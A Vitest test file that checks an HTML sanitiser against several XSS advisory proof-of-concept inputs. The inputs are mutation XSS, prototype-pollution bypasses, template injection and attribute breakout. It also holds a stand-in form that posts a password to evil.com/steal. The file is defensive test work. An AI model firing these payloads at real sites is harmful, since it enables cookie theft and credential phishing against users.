// @vitest-environment jsdom

import { describe, expect, it, vi } from 'vitest';

async function loadSanitizeHTML() {
  vi.resetModules();
  const module = await import('./sanitize');
  return module.sanitizeHTML;
}

function parseFragment(html: string): DocumentFragment {
  const template = document.createElement('template');
  template.innerHTML = html;
  return template.content;
}

function expectInertHTML(html: string): void {
  const fragment = parseFragment(html);
  expect(fragment.querySelector('script, iframe, object, embed')).toBeNull();

  for (const element of Array.from(fragment.querySelectorAll('*'))) {
    expect(element.tagName.includes('-')).toBe(false);

    for (const attr of Array.from(element.attributes)) {
      const name = attr.name.toLowerCase();
      const value = attr.value.trim().toLowerCase();

      expect(name.startsWith('on')).toBe(false);
      expect(name).not.toBe('srcdoc');
      expect(value.startsWith('javascript:')).toBe(false);
      expect(value.startsWith('data:text/html')).toBe(false);
    }
  }
}

describe('sanitizeHTML', () => {
  it('keeps the mutation-XSS re-contextualization PoC inert [GHSA-h8r8-wccr-v5f2]', async () => {
    const sanitizeHTML = await loadSanitizeHTML();
    const payload = ` <img src=x alt="</xmp><img src=x onerror=alert('expoc')>">`;

    const sanitized = sanitizeHTML(payload);
    const finalPass = sanitizeHTML(`<xmp>${sanitized}</xmp>`);

    expectInertHTML(sanitized);
    expectInertHTML(finalPass);
    expect(finalPass.toLowerCase()).not.toContain('onerror');
  });

  it('ignores prototype-polluted custom element handling [GHSA-v9jr-rg53-9pgp]', async () => {
    Object.defineProperty(Object.prototype, 'tagNameCheck', {
      value: /.*/,
      configurable: true
    });
    Object.defineProperty(Object.prototype, 'attributeNameCheck', {
      value: /.*/,
      configurable: true
    });

    try {
      const sanitizeHTML = await loadSanitizeHTML();
      const sanitized = sanitizeHTML('<x-x onfocus=alert(document.cookie) tabindex=0 autofocus>');

      expectInertHTML(sanitized);
      expect(sanitized).not.toContain('<x-x');
      expect(sanitized.toLowerCase()).not.toContain('onfocus');
    } finally {
      delete Object.prototype.tagNameCheck;
      delete Object.prototype.attributeNameCheck;
    }
  });

  it('keeps function ADD_TAGS / FORBID_TAGS bypass payloads inert [GHSA-h7mw-gpvr-xq4m]', async () => {
    const sanitizeHTML = await loadSanitizeHTML();
    const iframePayload = '<iframe src="https://evil.com"></iframe>';
    const formPayload = '<form action="https://evil.com/steal"><input name=password></form>';

    const sanitized = `${sanitizeHTML(iframePayload)}${sanitizeHTML(formPayload)}`;

    expectInertHTML(sanitized);
    expect(sanitized).not.toContain('<iframe');
  });

  it('keeps SAFE_FOR_TEMPLATES / RETURN_DOM split-node PoC inert as plain HTML [GHSA-crv5-9vww-q3g8]', async () => {
    const sanitizeHTML = await loadSanitizeHTML();
    const payload =
      '<div id="app">{<foo></foo>{constructor.constructor("alert(1)")()}<foo></foo>}</div>';

    const sanitized = sanitizeHTML(payload);

    expectInertHTML(sanitized);
    expect(sanitized).not.toContain('<foo');
    expect(parseFragment(sanitized).querySelector('#app')?.textContent).toContain(
      'constructor.constructor'
    );
  });

  it('adds rel to target blank links only', async () => {
    const sanitizeHTML = await loadSanitizeHTML();
    const sanitized = sanitizeHTML(
      '<a href="https://example.com" target="_blank">blank</a><a href="/recipes" target="_self">self</a>'
    );
    const links = Array.from(parseFragment(sanitized).querySelectorAll('a'));

    expect(links[0]?.getAttribute('rel')).toBe('noopener noreferrer nofollow ugc');
    expect(links[1]?.hasAttribute('rel')).toBe(false);
  });

  it('neuters profile-field-style attribute breakout payloads', async () => {
    const sanitizeHTML = await loadSanitizeHTML();
    const displayName = '" onerror=alert(1) data-owned="';
    const sanitized = sanitizeHTML(`<img alt="${displayName}" src="/avatar.png">`);

    expectInertHTML(sanitized);
    expect(sanitized.toLowerCase()).not.toContain('onerror');
  });

  it('keeps translation-style sanitize then mangle then sanitize output inert', async () => {
    const sanitizeHTML = await loadSanitizeHTML();
    const translated = sanitizeHTML('<p>hello <img src=x onerror=alert(1)></p>');
    const mangled = translated.replace('hello', 'hola <svg><script>alert(1)</script></svg>');
    const finalPass = sanitizeHTML(mangled);

    expectInertHTML(finalPass);
    expect(finalPass.toLowerCase()).not.toContain('script');
    expect(finalPass.toLowerCase()).not.toContain('onerror');
  });

  it('returns an empty string during SSR instead of raw HTML', async () => {
    vi.resetModules();
    const originalWindow = globalThis.window;

    Object.defineProperty(globalThis, 'window', {
      value: undefined,
      configurable: true
    });

    try {
      const { sanitizeHTML } = await import('./sanitize');
      expect(sanitizeHTML('<p>server</p><img src=x onerror=alert(1)>')).toBe('');
    } finally {
      Object.defineProperty(globalThis, 'window', {
        value: originalWindow,
        configurable: true
      });
      vi.resetModules();
    }
  });
});
